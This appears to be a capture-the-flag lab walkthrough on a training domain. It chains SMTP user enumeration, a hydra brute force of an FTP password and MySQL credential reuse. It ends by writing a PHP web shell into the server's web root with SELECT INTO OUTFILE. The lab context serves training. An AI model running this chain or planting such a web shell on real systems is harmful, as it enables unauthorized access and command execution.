Attacking Common Services - Easy

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

    HTB{...}

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

Question 1
You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.
> ./smtp-user-enum -m RCPT -U ~/Downloads/users.list -d inlanefreight.htb  10.129.203.7 587
[SUCC] fiona         250 OK
> hydra -l 'fiona' -P /home/checkmate/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt -f ftp://10.129.200.116

[21][ftp] host: 10.129.200.116   login: fiona   password: 987654321
> ftp 10.129.200.116 -p 21
ftp> ls
229 Entering Extended Passive Mode (|||26285|)
ftp: Can't connect to `10.129.200.116:26285': Connection timed out
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
ftp> get WebServersInfo.txt
> cat WebServersInfo.txt
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php

>  mysql -u fiona -p987654321 -h 10.129.227.65
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\xampp\htdocs\shell2.php';

